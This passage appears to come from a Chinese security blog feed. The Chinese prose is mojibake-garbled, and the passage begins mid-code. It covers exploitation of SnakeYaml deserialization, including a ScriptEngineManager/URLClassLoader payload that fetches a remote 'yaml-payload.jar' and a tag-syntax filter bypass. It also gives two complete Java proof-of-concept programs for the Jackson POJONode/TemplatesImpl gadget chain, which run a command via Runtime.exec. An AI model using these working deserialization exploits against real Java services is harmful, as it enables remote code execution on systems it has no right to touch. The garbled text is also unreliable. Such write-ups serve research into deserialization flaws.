class="hljs-operator">=</span> deflater.deflate(buffer);<br>            outputStream.write(buffer, <span class="hljs-number">0</span>, compressedSize);<br>        &#125;<br><br>        outputStream.close();<br>        <span class="hljs-keyword">return</span> outputStream.toByteArray();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ—¢ç„¶å¯ä»¥å†™æ–‡ä»¶ï¼Œé‚£å°±æŠŠjarå†™å…¥ç›®æ ‡ç¯å¢ƒï¼Œç„¶åå†é€šè¿‡URLClassloaderæœ¬åœ°åŠ è½½</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Yaml</span> <span class="hljs-variable">yaml</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Yaml</span>();<br><span class="hljs-type">String</span> <span class="hljs-variable">poc</span> <span class="hljs-operator">=</span> createPoc(<span class="hljs-string">&quot;./yaml-payload.jar&quot;</span>, <span class="hljs-string">&quot;E:/evil.jar&quot;</span>);<br>yaml.load(poc);<br><span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;!!javax.script.ScriptEngineManager [\n&quot;</span> +<br>    <span class="hljs-string">&quot;!!java.net.URLClassLoader [[\n&quot;</span> +<br>    <span class="hljs-string">&quot;!!java.net.URL [\&quot;file:///E:/evil.jar\&quot;]\n&quot;</span> +<br>    <span class="hljs-string">&quot;]]\n&quot;</span> +<br>    <span class="hljs-string">&quot;]&quot;</span>;<br>yaml.load(s);<br></code></pre></td></tr></table></figure><h2 id="Yaml-load"><a href="#Yaml-load" class="headerlink" title="Yaml#load()"></a>Yaml#load()</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> &lt;T&gt; T <span class="hljs-title function_">load</span><span class="hljs-params">(String yaml)</span> &#123;<br><span class="hljs-keyword">return</span> (T) loadFromReader(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StreamReader</span>(yaml), Object.class);<br>&#125;<br></code></pre></td></tr></table></figure><p>payloadå­˜å‚¨äºStreamReaderçš„streamå­—æ®µï¼š</p><p><img src="/2024/08/03/SnakeYaml/image-20240803155110646.png" alt="image-20240803155110646"></p><p>å›åˆ°<code>loadFromReader()</code>ï¼Œåˆ›å»ºäº†ä¸€ä¸ªComposerå¯¹è±¡ï¼Œå¹¶å°è£…åˆ°<code>constructor</code>ä¸­ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> Object <span class="hljs-title function_">loadFromReader</span><span class="hljs-params">(StreamReader sreader, Class&lt;?&gt; type)</span> &#123;<br>    <span class="hljs-type">Composer</span> <span class="hljs-variable">composer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Composer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ParserImpl</span>(sreader), resolver, loadingConfig);<br>    constructor.setComposer(composer);<br>    <span class="hljs-keyword">return</span> constructor.getSingleData(type);<br>&#125;<br></code></pre></td></tr></table></figure><p>è·Ÿè¿›<code>getSingleData</code>ï¼š</p><p><img src="/2024/08/03/SnakeYaml/image-20240803155215536.png" alt="image-20240803155215536"></p><p><code>getSingleNode()</code>å°†pocæ”¹é€ ä¸ºå¦‚ä¸‹ï¼š</p><blockquote><p>&lt;org.yaml.snakeyaml.nodes.SequenceNode (tag&#x3D;tag:yaml.org,2002:javax.script.ScriptEngineManager, value&#x3D;[&lt;org.yaml.snakeyaml.nodes.SequenceNode (tag&#x3D;tag:yaml.org,2002:java.net.URLClassLoader, value&#x3D;[&lt;org.yaml.snakeyaml.nodes.SequenceNode (tag&#x3D;tag:yaml.org,2002:seq, value&#x3D;[&lt;org.yaml.snakeyaml.nodes.SequenceNode (tag&#x3D;tag:yaml.org,2002:java.net.URL, value&#x3D;[&lt;org.yaml.snakeyaml.nodes.ScalarNode (tag&#x3D;tag:yaml.org,2002:str, value&#x3D;<a href="http://127.0.0.1:9999/yaml-payload.jar)%3E])%3E])%3E])%3E])%3E">http://127.0.0.1:9999/yaml-payload.jar)&gt;])&gt;])&gt;])&gt;])&gt;</a></p></blockquote><p>è‹¥è¿‡æ»¤äº†<code>!!</code>ï¼Œå¯åˆ©ç”¨æ­¤tagè§„åˆ™è¿›è¡Œç»•è¿‡ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">!tag:yaml.org,<span class="hljs-number">2002</span>:javax.script.ScriptEngineManager [!tag:yaml.org,<span class="hljs-number">2002</span>:java.net.URLClassLoader [[!tag:yaml.org,<span class="hljs-number">2002</span>:java.net.URL [<span class="hljs-string">&quot;http://ip/yaml-payload.jar&quot;</span>]]]]<br></code></pre></td></tr></table></figure><p>æ¥ç€è°ƒç”¨<code>constructDocument()</code>å¯¹ä¸Šé¢pocè¿›è¡Œå¤„ç†ï¼š</p><p><img src="/2024/08/03/SnakeYaml/image-20240803155327831.png" alt="image-20240803155327831"></p><p>è·Ÿè¿›<code>constructObject()</code> &#x3D;&gt; <code>constructObjectNoCheck()</code>ï¼š</p><p><img src="/2024/08/03/SnakeYaml/image-20240803155346497.png" alt="image-20240803155346497"></p><p>nodeæ”¾å…¥<code>recursiveObjects</code>ï¼Œè¿›å…¥<code>constructor.construct(node)</code>ï¼š</p><p><img src="/2024/08/03/SnakeYaml/image-20240803155404381.png" alt="image-20240803155404381"></p><p><img src="/2024/08/03/SnakeYaml/image-20240803155418302.png" alt="image-20240803155418302"></p><p>éå†èŠ‚ç‚¹ï¼Œè°ƒç”¨<code>constructObject()</code>åˆå¾ªç¯å›å»äº†</p><blockquote><p>constructObjectNoCheck()-&gt;</p><p>BaseConstructor#construct()-&gt;</p><p>Contructor#construct()-&gt;</p><p>é€’å½’Contructor#constructObject()</p></blockquote><p>ä¸Šé¢çš„POCæœ‰5ä¸ªnodeï¼Œæ‰€ä»¥å¾ªç¯5æ¬¡ã€‚</p><p>å…ˆåè¿›è¡Œäº†URLã€URLClassLoaderã€ScriptEngineManagerçš„å®ä¾‹åŒ–</p><p>æ³¨æ„è¿™é‡Œå®ä¾‹åŒ–æ˜¯æœ‰ä¼ å‚æ•°(argumentList)çš„ï¼ŒæŠŠå‰ä¸€ä¸ªç±»çš„å®ä¾‹åŒ–å¯¹è±¡å½“ä½œä¸‹ä¸ªç±»æ„é€ å™¨çš„å‚æ•°ã€‚</p><p>æœ€åè¿›å…¥ScriptEngineManagerçš„æ— å‚æ„é€ å™¨ï¼Œè¿æ¥ä¸Šäº†ä¸Šæ–‡çš„SPIæœºåˆ¶ã€‚</p><p><img src="/2024/08/03/SnakeYaml/image-20240803155529534.png" alt="image-20240803155529534"></p><p>å‚è€ƒï¼š</p><p><a href="https://mp.weixin.qq.com/s?__biz=MzkxNDMxMTQyMg==&mid=2247496898&idx=1&sn=9df9a236a3c437522bdf125cf92c6e24&chksm=c172e553f6056c4592696a15d5270e30386a229ca35d8eb1cf588498c95d78b28f2766975234&scene=27&key=7917b196593e1041903cc963f4d8e8dd309fc34822ec523c96ef6852b6eb00243ae09c3a475f21000c466a1481f5d9ef88661e5ccd3eae00b654271eecd790081cf9cb2b874e0566a9b1bf83ab3e3a9dffbce029a9983bd1e617a34873e1a5cf0d90ff63073904c1c64a7ab0832fd5396612ac69385a93896810c27b3466f6ca&ascene=0&uin=MzM0MTE3MTk2MQ==&devicetype=Windows+10+x64&version=6308011a&lang=zh_CN&exportkey=n_ChQIAhIQk1l7Og6o32ldfRBgt0m/7xLgAQIE97dBBAEAAAAAAFyoNDyY7FgAAAAOpnltbLcz9gKNyK89dVj0STE6v0lILRu1tKDn0ZDKVMzBwrLXZCB+mUzHXSOZsIYr0w0A/cuvTqwms4Rt/kjpf8zHxxTi8IwvjYn/DZ9Q33Hc5vfX2hilkR53helcExsLrLyslL/WBsef9XI/6wZMWmG6oy8JJGplsmLrW+xqvmnB4f5wILv176CzXoS3esuvsQ+hfcDKd/Efu5bUKYhs0ZoGh1vCyZD6VtP9NEg2tTCVHV3tJAqerIo+gJoEHIoL7rOFzs/q0qic&acctmode=0&pass_ticket=Q7/iUlx9i6XS/NSi17wpXoqBYZHAHgY0basv8D4BZIN+CoAkTfFeOqqNDBcbXW05phWaLHgqOHGN8cecKlsdgw==&wx_header=1&fontgear=2">SnakeYamlååºåˆ—åŒ–åŠä¸å‡ºç½‘åˆ©ç”¨</a></p><p><a href="https://p4d0rn.gitbook.io/java/serial-journey/snakeyaml">SnakeYaml | Java (gitbook.io)</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Jackson</title>
    <link href="/2024/08/03/Jackson/"/>
    <url>/2024/08/03/Jackson/</url>
    
    <content type="html"><![CDATA[<p>Jacksonè·Ÿfastjsonå¾ˆç›¸è¿‘ï¼Œæ‰€ä»¥å‰è¨€è¿˜æ˜¯ä»fastjsonè¿‡æ¸¡è¿‡æ¥ã€‚</p><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ä¸»è¦è¿˜æ˜¯ä»‹ç»JacksonåŸç”Ÿååºåˆ—åŒ–å¼•ç”¨ã€‚</p><p>è¿™é‡Œä»Fastjsoné‡æ–°å¼€å§‹è¯´èµ·ï¼š</p><p>åœ¨Fastjsonä¸­ï¼Œ<code>JSONArray</code>å’Œ<code>JSONObject</code>éƒ½å®ç°äº†<code>Serializable</code>æ¥å£ï¼Œè¿™ä¸¤ä¸ªç±»çš„<code>toString</code>æ–¹æ³•éƒ½èƒ½è§¦å‘<code>toJSONString</code>çš„è°ƒç”¨ï¼Œè¦æŠŠä¸€ä¸ªJSONå¯¹è±¡è½¬å­—ç¬¦ä¸²ï¼Œå¿…ç„¶æ¶‰åŠåˆ°å¯¹è±¡å±æ€§çš„è·å–ï¼Œä¼šè°ƒç”¨åˆ°å¯¹è±¡çš„getteræ–¹æ³•ã€‚</p><p>ä»1.2.49å¼€å§‹ï¼Œ<code>JSONArray</code>å’Œ<code>JSONObject</code>éƒ½å®ç°äº†è‡ªå·±çš„<code>readObject</code>æ–¹æ³•ï¼Œè‡ªå®šä¹‰äº†ä¸€ä¸ª<code>SecureObjectInputStream</code>å¹¶é‡å†™äº†<code>resolveClass</code>æ–¹æ³•ï¼Œé‡Œé¢è°ƒç”¨äº†<code>checkAutoType</code>æ¥å¯¹ååºåˆ—åŒ–çš„ç±»è¿›è¡Œé»‘ç™½åå•æ£€æŸ¥ã€‚éœ€è¦é€šè¿‡åŸç”Ÿååºåˆ—åŒ–çš„å¼•ç”¨æœºåˆ¶æ¥ç»•è¿‡ã€‚</p><p>åˆ©ç”¨é“¾ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">toString(e.g. BadAttributeValueExpException#readObject) <br>-&gt; toJSONString <br>-&gt; evil <span class="hljs-title function_">getter</span><span class="hljs-params">(e.g. TemplatesImpl#getOutputProperties)</span><br></code></pre></td></tr></table></figure><h2 id="Jackson-æµ…å®¡"><a href="#Jackson-æµ…å®¡" class="headerlink" title="Jackson æµ…å®¡"></a>Jackson æµ…å®¡</h2><p>Jacksonçš„ä½¿ç”¨å’ŒFastjsonç±»ä¼¼</p><table><thead><tr><th align="left">FastJson</th><th align="left">Jackson</th></tr></thead><tbody><tr><td align="left">JSONObject</td><td align="left">ObjectNode</td></tr><tr><td align="left">JSONArray</td><td align="left">ArrayNode</td></tr><tr><td align="left">JSON.parseObjecté™æ€è°ƒç”¨</td><td align="left">ObjectMapper.readTreeå¯¹è±¡è°ƒç”¨</td></tr></tbody></table><p>ç»§æ‰¿å…³ç³»ï¼š<code>POJONode</code>-&gt;<code>ValueNode</code>-&gt;<code>BaseJsonNode</code> -&gt; <code>JsonNode</code></p><p>åˆ©ç”¨ç‚¹åœ¨<code>BaseJsonNode#toString</code>ï¼Œè·Ÿåˆ°åé¢ ï¼Œå¯¹äºè‡ªå®šä¹‰çš„ç±»ä½¿ç”¨<code>BeanSerializer</code>è¿›è¡Œååºåˆ—åŒ–ï¼Œè°ƒç”¨<code>serializeFields</code>å¯¹å±æ€§è¿›è¡Œè¿˜åŸæ—¶,<code>BeanPropertyWriter</code>è°ƒç”¨<code>getter</code>ã€‚</p><p>è¿˜æ˜¯ç”¨<code>TemplatesImpl#getOutputProperties</code>å»æ‰“ï¼Œä½†æ˜¯è¿™é‡Œç›´æ¥ååºåˆ—åŒ–ä¼šå‡ºç°é—®é¢˜</p><blockquote><p>Failed to JDK serialize <code>POJONode</code> value: (was java.lang.NullPointerException) (through reference chain: com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl[â€œoutputPropertiesâ€])</p></blockquote><p>æŠ¥é”™StackTraceï¼š</p><p><img src="/2024/08/03/Jackson/image-20240803150351459.png" alt="image-20240803150351459"></p><p><code>invokeWriteReplace</code>åˆ¤æ–­<code>writeReplaceMethod</code>æ˜¯å¦å­˜åœ¨ï¼Œå­˜åœ¨åˆ™è°ƒç”¨ï¼š</p><p><img src="/2024/08/03/Jackson/image-20240803150432510.png" alt="image-20240803150432510"></p><p>é‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦ä½¿ç”¨javassistæŠŠè¿™ä¸ªç±»çš„<code>writeReplaceMethod</code>åˆ æ‰å³å¯ã€‚</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> javassist.*;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">// å»é™¤BaseJsonNodeçš„writeReplaceæ–¹æ³•</span><br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span>ClassPool.getDefault().get(<span class="hljs-string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);<br>        <span class="hljs-type">CtMethod</span> <span class="hljs-variable">ctMethod</span> <span class="hljs-operator">=</span> ctClass.getDeclaredMethod(<span class="hljs-string">&quot;writeReplace&quot;</span>);<br>        ctClass.removeMethod(ctMethod);<br>        ctClass.toClass();<br><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, clazz);<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);<br>        clazz.addConstructor(constructor);<br>        <span class="hljs-type">byte</span>[][] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br>        setValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, bytes);<br>        setValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>);<br>        setValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-literal">null</span>);<br><br>        <span class="hljs-type">POJONode</span> <span class="hljs-variable">pojo</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(templates);<br><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">bd</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        setValue(bd, <span class="hljs-string">&quot;val&quot;</span>, pojo);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(bd);<br>        oos.close();<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(baos.toByteArray()));<br>        ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç¨³å®šç‰ˆæœ¬ï¼š<a href="https://xz.aliyun.com/t/12846?time__1311=GqGxuDcDRGexlxx2DUrED9G5Witkv5ox">ä»JSON1é“¾ä¸­å­¦ä¹ å¤„ç†JACKSONé“¾çš„ä¸ç¨³å®šæ€§ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><span class="hljs-keyword">import</span> javassist.CtMethod;<br><span class="hljs-keyword">import</span> org.springframework.aop.framework.AdvisedSupport;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JSON</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> ClassPool.getDefault().get(<span class="hljs-string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);<br>        <span class="hljs-type">CtMethod</span> <span class="hljs-variable">writeReplace</span> <span class="hljs-operator">=</span> ctClass.getDeclaredMethod(<span class="hljs-string">&quot;writeReplace&quot;</span>);<br>        ctClass.removeMethod(writeReplace);<br>        ctClass.toClass();<br>        <span class="hljs-type">POJONode</span> <span class="hljs-variable">node</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(makeTemplatesImplAopProxy(<span class="hljs-string">&quot;calc&quot;</span>));<br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        setFieldValue(val, <span class="hljs-string">&quot;val&quot;</span>, node);<br><br>        serialize(val);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(o);<br>        oos.close();<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(baos.toByteArray()));<br>        ois.readObject();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">makeTemplatesImplAopProxy</span><span class="hljs-params">(String cmd)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">AdvisedSupport</span> <span class="hljs-variable">advisedSupport</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AdvisedSupport</span>();<br>        advisedSupport.setTarget(makeTemplatesImpl(cmd));<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>).getConstructor(AdvisedSupport.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler) constructor.newInstance(advisedSupport);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;, handler);<br>        <span class="hljs-keyword">return</span> proxy;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">makeTemplatesImpl</span><span class="hljs-params">(String cmd)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, clazz);<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);<br>        clazz.addConstructor(constructor);<br>        <span class="hljs-type">byte</span>[][] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br>        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, bytes);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>);<br>        <span class="hljs-keyword">return</span> templates;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯¹äºJacksonçš„getteråˆ©ç”¨ï¼Œä¹Ÿå¯ä»¥çœ‹ï¼š</p><p><a 